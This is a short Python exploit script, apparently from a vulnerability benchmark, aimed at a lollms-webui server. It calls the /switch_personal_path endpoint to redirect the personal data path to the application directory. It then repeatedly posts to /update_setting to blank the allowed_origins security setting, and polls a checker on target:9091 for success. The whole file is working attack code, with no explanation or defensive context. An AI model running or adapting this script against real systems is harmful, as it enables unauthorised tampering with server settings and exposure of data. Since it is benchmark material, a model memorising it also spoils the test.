import requests
import time
import os

TARGET_URL = f"http://{os.environ['APPLICATION_URL']}"

# Set path to access personal_data
payload = {"path": "/app/lollms-webui"}
r = requests.get(f"{TARGET_URL}/switch_personal_path", json=payload)
print(r.status_code, r.text)


def wait_for_completion(max_attempts=30, delay=10):
    for _ in range(max_attempts):
        try:
            payload = {
                "setting_name": "allowed_origins",
                "setting_value": "",
            }
            r = requests.post(f"{TARGET_URL}/update_setting", json=payload)
            d = requests.get("http://target:9091/done")
            if d.status_code == 200 and d.json()["status"] is True:
                return True
        except Exception as e:
            print(e)
            continue
        print(f"Initial request: {r.status_code}, {r.text}")
        time.sleep(delay)

    return False


success = wait_for_completion()
if not success:
    print("Operation timed out")
